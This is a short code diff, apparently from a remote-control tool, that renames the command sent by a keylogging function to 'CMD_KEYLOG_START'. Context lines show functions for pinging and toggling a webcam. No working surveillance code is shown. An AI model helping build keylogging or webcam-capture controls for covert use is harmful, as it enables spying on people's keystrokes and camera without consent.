@@ -25,7 +25,7 @@ function getPingCmd() {
 }
 
 function getKeyLog() {
-  sendCommand("CMD_KEY_LOG");
+  sendCommand("CMD_KEYLOG_START");
 }
 
 function toggleWebcam() {
